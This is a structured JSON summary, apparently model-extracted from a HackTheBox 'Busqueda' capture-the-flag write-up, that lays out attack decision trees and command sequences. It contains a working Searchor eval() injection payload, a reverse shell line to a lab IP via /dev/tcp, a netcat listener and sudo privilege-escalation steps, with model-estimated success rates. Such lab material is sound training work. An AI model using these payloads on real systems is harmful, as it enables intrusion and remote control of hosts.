{
  "writeup_id": "Htb_Busqueda",
  "scenario_fingerprint": {
    "scenario_name": "linux_flask_searchor_eval_injection",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+flask_web",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "eval_injection",
    "privilege_path": "web_to_user_to_root",
    "attack_complexity": "easy",
    "estimated_time": "30-45 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "searchor_python_package",
      "unsafe_eval_vulnerability",
      "flask_werkzeug_stack",
      "gitea_virtualhost"
    ],
    "environmental_clues": [
      "werkzeug_python_headers",
      "flask_404_pages",
      "ubuntu_22.04_services",
      "search_engine_aggregator"
    ],
    "similar_scenarios": [
      "python_eval_injection_boxes",
      "flask_rce_scenarios"
    ],
    "unique_aspects": [
      "searchor_cli_vulnerability",
      "cve_2023_searchor",
      "gitea_source_disclosure",
      "sudo_script_privilege_escalation"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Command Injection via eval()",
        "success_reason": "Searchor 2.4.0 used unsafe eval() in CLI processing user input",
        "prerequisite_indicators": [
          "python_flask_application",
          "searchor_library_in_use",
          "version_2.4.0_or_earlier",
          "user_input_processed_by_cli"
        ],
        "recognition_patterns": [
          "werkzeug server headers",
          "searchor mentioned in footer",
          "flask application structure",
          "search functionality with engine selection"
        ],
        "failure_modes": [
          "searchor_version_2.4.2_or_later",
          "input_sanitization_implemented",
          "eval_replaced_with_safe_methods",
          "cli_not_used_for_web_processing"
        ],
        "environmental_factors": [
          "outdated_python_packages",
          "direct_cli_integration_in_web_app",
          "lack_of_input_validation",
          "unsafe_eval_usage_patterns"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "Sudo Privilege Escalation",
        "success_reason": "User could run Python script as root without password",
        "prerequisite_indicators": [
          "sudo_permissions_available",
          "script_execution_allowed",
          "source_code_accessible",
          "configuration_files_writable"
        ],
        "recognition_patterns": [
          "sudo -l shows script permissions",
          "python script in sudo rules",
          "gitea or source code repository",
          "relative path vulnerabilities"
        ],
        "failure_modes": [
          "absolute_paths_enforced",
          "script_source_not_accessible",
          "secure_sudo_configuration",
          "input_validation_in_script"
        ],
        "environmental_factors": [
          "development_environment_practices",
          "gitea_self_hosted_repository",
          "credential_reuse_patterns",
          "insufficient_sudo_hardening"
        ],
        "success_probability": 0.78,
        "typical_timeframe": "20-45 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Searchor 2.4.0 eval() vulnerability",
        "discovery_method": "Version identification and CVE research",
        "why_critical": "Direct command execution through unsafe eval in user input",
        "how_to_recognize": [
          "searchor version in footer or headers",
          "flask application with search functionality",
          "github releases showing security patches",
          "eval usage in cli processing"
        ],
        "follow_up_actions": [
          "craft_injection_payload",
          "test_command_execution",
          "establish_reverse_shell",
          "enumerate_system_privileges"
        ]
      },
      {
        "discovery": "Gitea virtual host with credentials",
        "discovery_method": "Subdomain enumeration and credential reuse",
        "why_critical": "Source code access revealed privilege escalation path",
        "how_to_recognize": [
          "gitea.domain.tld subdomain",
          "git repository hosting",
          "credential reuse from initial access",
          "development environment indicators"
        ],
        "follow_up_actions": [
          "enumerate_repositories",
          "download_source_code",
          "analyze_sudo_scripts",
          "identify_configuration_paths"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "service_user",
        "escalation_method": "Sudo script manipulation",
        "why_possible": "Python script with relative imports and writable config",
        "recognition_signs": [
          "sudo_permissions_on_python_script",
          "relative_path_imports",
          "writable_configuration_files",
          "source_code_access_available"
        ],
        "exploitation_path": "Gitea access → Source analysis → Config manipulation → Root execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80 open on Linux host with Flask application",
        "decision": "Identify web application technology stack and version information",
        "reasoning": "Flask applications often expose version info in headers, need to identify underlying libraries",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "directory_bruteforce",
            "when": "if no version info found"
          },
          {
            "option": "parameter_fuzzing",
            "when": "if application has user input"
          }
        ],
        "success_indicators": [
          "werkzeug_version_identified",
          "python_version_identified",
          "application_framework_identified"
        ],
        "next_decision": "analyze_application_functionality"
      },
      {
        "step": 2,
        "situation": "Identified Flask app using Searchor library with version info",
        "decision": "Research known vulnerabilities in identified library version",
        "reasoning": "Searchor 2.4.0 has known eval vulnerability in CLI component",
        "confidence": 0.95,
        "prerequisites": [
          "library_version_identified",
          "application_functionality_understood"
        ],
        "success_indicators": [
          "cve_or_vulnerability_found",
          "exploit_method_identified"
        ],
        "failure_fallbacks": [
          "parameter_injection_testing",
          "directory_traversal",
          "file_upload_testing"
        ]
      },
      {
        "step": 3,
        "situation": "Found eval vulnerability in Searchor CLI used by web application",
        "decision": "Test command injection through query parameter",
        "reasoning": "Unsafe eval allows arbitrary code execution through crafted input",
        "confidence": 0.85,
        "prerequisites": [
          "user_input_identified",
          "eval_vulnerability_confirmed"
        ],
        "success_indicators": [
          "command_execution_confirmed",
          "output_returned_in_response"
        ],
        "failure_fallbacks": [
          "try_different_injection_points",
          "blind_command_injection"
        ]
      }
    ],
    "branching_logic": {
      "if_version_info_found": {
        "action": "research_vulnerabilities",
        "tools": [
          "searchsploit",
          "github_security_advisories",
          "cve_databases"
        ],
        "next_phase": "vulnerability_validation"
      },
      "if_eval_injection_succeeds": {
        "action": "establish_reverse_shell",
        "tools": [
          "nc",
          "bash",
          "python_reverse_shell"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_injection_fails": {
        "action": "try_alternative_vectors",
        "alternatives": [
          "parameter_pollution",
          "different_injection_syntax",
          "blind_techniques"
        ],
        "decision_criteria": "based_on_error_messages_and_response_behavior"
      },
      "if_shell_obtained": {
        "action": "enumerate_system_and_privileges",
        "purpose": "find_privilege_escalation_paths",
        "tools": [
          "sudo_-l",
          "find_suid",
          "linpeas"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_library_versions_in_headers",
        "reasoning": "version_info_often_leads_to_known_vulnerabilities",
        "applicability": "web_applications_with_exposed_frameworks"
      },
      {
        "rule": "test_eval_injection_with_import_statements",
        "reasoning": "python_eval_allows_module_imports_for_code_execution",
        "applicability": "python_applications_with_user_input"
      },
      {
        "rule": "setup_local_environment_to_test_exploits",
        "reasoning": "understanding_exact_syntax_needed_for_successful_injection",
        "applicability": "complex_injection_vulnerabilities"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Python Eval Injection",
        "mitre_id": "T1059.006",
        "required_services": [
          "http",
          "python"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "python_web_application",
          "flask_framework_detected",
          "searchor_library_in_use",
          "user_input_processed_by_eval"
        ],
        "success_indicators": [
          "werkzeug_server_header",
          "flask_error_pages",
          "searchor_version_below_2.4.2",
          "command_execution_response"
        ],
        "incompatible_with": [
          "input_sanitization_enabled",
          "searchor_version_2.4.2_or_higher",
          "eval_function_replaced"
        ],
        "confidence_boosters": [
          "python_version_in_headers",
          "flask_framework_indicators",
          "searchor_github_references",
          "cli_integration_patterns"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "Sudo Privilege Escalation",
        "mitre_id": "T1548.003",
        "required_services": [
          "ssh"
        ],
        "required_ports": [
          22
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "sudo_access_available",
          "python_script_execution_allowed",
          "script_source_accessible",
          "configuration_manipulation_possible"
        ],
        "success_indicators": [
          "sudo_l_shows_python_script",
          "gitea_service_discovered",
          "script_source_code_found",
          "arbitrary_execution_achieved"
        ],
        "incompatible_with": [
          "sudo_access_restricted",
          "script_hardened_properly",
          "source_code_unavailable"
        ],
        "confidence_boosters": [
          "virtualhost_enumeration_success",
          "credential_reuse_patterns",
          "gitea_repository_access"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "20-40 minutes"
      },
      {
        "technique": "Directory Traversal",
        "mitre_id": "T1083",
        "required_services": [
          "http"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "file_path_parameters",
          "insufficient_input_validation"
        ],
        "success_indicators": [
          "feroxbuster_finds_paths",
          "apache_server_status_accessible",
          "file_system_access_achieved"
        ],
        "incompatible_with": [
          "path_traversal_protection",
          "chroot_jail_enabled",
          "strict_file_permissions"
        ],
        "confidence_boosters": [
          "apache_default_configurations",
          "server_status_endpoint",
          "predictable_file_structures"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "5-15 minutes"
      }
    ],
    "environmental_detectors": {
      "python_web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https",
          "werkzeug",
          "flask"
        ],
        "banner_indicators": [
          "Werkzeug",
          "Python",
          "Flask"
        ],
        "confidence_threshold": 0.9
      },
      "linux_system": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh",
          "openssh"
        ],
        "banner_indicators": [
          "Ubuntu",
          "OpenSSH"
        ],
        "confidence_threshold": 0.85
      },
      "git_repository": {
        "port_indicators": [
          80,
          443,
          3000
        ],
        "service_indicators": [
          "http",
          "https",
          "gitea"
        ],
        "banner_indicators": [
          "Gitea",
          "Git"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "python_eval_injection",
          "when": "python_web_app_detected_and_searchor_present",
          "reason": "high_success_rate_direct_code_execution"
        },
        {
          "attack": "directory_bruteforce",
          "when": "web_service_detected",
          "reason": "reveals_attack_surface_and_endpoints"
        }
      ],
      "medium_priority": [
        {
          "attack": "sudo_privilege_escalation",
          "when": "initial_access_achieved",
          "reason": "requires_reconnaissance_but_reliable"
        },
        {
          "attack": "virtualhost_enumeration",
          "when": "domain_names_in_use",
          "reason": "often_reveals_additional_services"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Python eval() Code Injection",
        "mitre_id": "T1059.006",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "Searchor CLI",
            "command_template": "searchor search {engine} \"' + __import__('os').popen('{command}').read() + '\"",
            "actual_command": "searchor search GitHub \"' + __import__('os').popen('id').read() + '\"",
            "output_pattern": "Command output embedded in URL query parameter",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "Burp Suite Repeater",
            "command_template": "POST /search with query=' + __import__('os').popen('{command}').read() + '",
            "actual_command": "query=' + __import__('os').popen('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"').read() + '",
            "success_factors": [
              "vulnerable_eval_function",
              "user_controlled_input",
              "python_import_available"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "searchor_version_2.4.0_or_earlier",
          "web_application_using_searchor_cli",
          "user_input_passed_to_eval_function"
        ],
        "success_indicators": [
          "command_output_in_response",
          "reverse_shell_connection_established",
          "code_execution_confirmed"
        ],
        "common_failures": [
          "syntax_errors_in_payload",
          "improper_url_encoding",
          "network_connectivity_issues",
          "patched_searchor_version"
        ],
        "follow_up_techniques": [
          "privilege_escalation_enumeration",
          "credential_harvesting",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Virtual Environment Setup for Testing",
        "mitre_id": "T1588.002",
        "category": "resource_development",
        "phase": "preparation",
        "tools_used": [
          {
            "name": "Python venv",
            "command_template": "python -m venv {venv_name} && source {venv_name}/bin/activate",
            "actual_command": "python -m venv venv && source venv/bin/activate",
            "output_pattern": "(venv) prompt indicator",
            "effectiveness_rating": 5,
            "reliability": 0.99
          },
          {
            "name": "pip install",
            "command_template": "pip install {package}=={version}",
            "actual_command": "pip install searchor==2.4.0",
            "success_factors": [
              "package_available",
              "version_exists",
              "dependencies_resolved"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "python_installed",
          "pip_available",
          "internet_connectivity"
        ],
        "success_indicators": [
          "virtual_environment_created",
          "vulnerable_package_installed",
          "local_testing_successful"
        ],
        "common_failures": [
          "dependency_conflicts",
          "network_issues",
          "permission_problems"
        ],
        "follow_up_techniques": [
          "vulnerability_testing",
          "payload_development",
          "exploit_refinement"
        ],
        "time_investment": "5-10 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Burp Suite Repeater",
        "use_case": "web_application_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "medium",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "curl",
          "python_requests",
          "postman"
        ],
        "best_practices": [
          "url_encode_payloads_properly",
          "test_locally_first",
          "validate_syntax_before_sending"
        ]
      },
      {
        "tool": "nmap",
        "use_case": "network_reconnaissance",
        "effectiveness_rating": 5,
        "reliability": 0.99,
        "learning_curve": "low",
        "essential_for": [
          "initial_reconnaissance"
        ],
        "alternatives": [
          "masscan",
          "rustscan"
        ],
        "best_practices": [
          "start_with_fast_port_scan",
          "follow_up_with_service_detection",
          "identify_os_from_service_versions"
        ]
      },
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "web_application_enumeration"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "ffuf"
        ],
        "best_practices": [
          "use_appropriate_wordlists",
          "check_for_auto_filtering",
          "follow_discovered_links"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "searchor_eval_injection_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "nmap -p- --min-rate 10000 {target_ip}",
            "purpose": "Initial port discovery",
            "expected_output": "Open ports 22 and 80"
          },
          {
            "step": 2,
            "command": "nmap -p 22,80 -sCV {target_ip}",
            "purpose": "Service version detection",
            "expected_output": "Apache/Werkzeug with Python Flask"
          },
          {
            "step": 3,
            "command": "python -m venv venv && source venv/bin/activate && pip install searchor==2.4.0",
            "purpose": "Setup local testing environment",
            "expected_output": "Vulnerable searchor version installed"
          },
          {
            "step": 4,
            "command": "searchor search GitHub \"' + __import__('os').popen('id').read() + '\"",
            "purpose": "Test payload locally",
            "expected_output": "Command output in URL"
          },
          {
            "step": 5,
            "command": "POST /search with query=' + __import__('os').popen('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"').read() + '",
            "purpose": "Execute reverse shell payload",
            "expected_output": "Reverse shell connection"
          }
        ],
        "success_rate": 0.92,
        "typical_duration": "20-30 minutes"
      },
      {
        "sequence_name": "shell_upgrade_sequence",
        "steps": [
          {
            "step": 1,
            "command": "nc -lnvp 443",
            "purpose": "Start netcat listener",
            "expected_output": "Listening on port 443"
          },
          {
            "step": 2,
            "command": "script /dev/null -c bash",
            "purpose": "Upgrade shell with script",
            "expected_output": "Better shell with job control"
          },
          {
            "step": 3,
            "command": "stty raw -echo; fg",
            "purpose": "Enable raw terminal mode",
            "expected_output": "Fully interactive shell"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "2-3 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Busqueda",
      "difficulty": "Easy",
      "os": "Ubuntu 22.04",
      "platform": "HackTheBox",
      "release_date": "2023-04-08",
      "author": "kavigihan",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "low",
      "skill_level_required": "beginner",
      "primary_attack_vectors": [
        "code_injection",
        "sudo_abuse",
        "git_enumeration"
      ],
      "key_vulnerabilities": [
        "unsafe_eval",
        "sudo_misconfiguration",
        "credential_reuse"
      ],
      "environment_type": "web_application_server",
      "real_world_relevance": "high",
      "learning_value": [
        "python_injection",
        "sudo_privilege_escalation",
        "git_reconnaissance"
      ],
      "prerequisite_knowledge": [
        "basic_python",
        "linux_fundamentals",
        "web_application_basics"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "code_injection",
        "privilege_escalation",
        "source_code_analysis"
      ],
      "attack_types": [
        "initial_access",
        "privilege_escalation",
        "credential_access"
      ],
      "defensive_lessons": [
        "input_validation",
        "sudo_hardening",
        "secure_coding_practices"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Knife",
        "Previse",
        "Writer"
      ],
      "similarity_reasons": [
        "web_code_injection",
        "git_enumeration",
        "sudo_escalation"
      ],
      "unique_aspects": [
        "searchor_tool_exploitation",
        "gitea_integration",
        "virtualhost_discovery"
      ],
      "difficulty_factors": [
        "straightforward_injection",
        "clear_escalation_path",
        "good_enumeration_practice"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T17:20:19.173812",
    "original_file": "0xdf_writeups/Htb Busqueda.md",
    "content_length": 24668,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}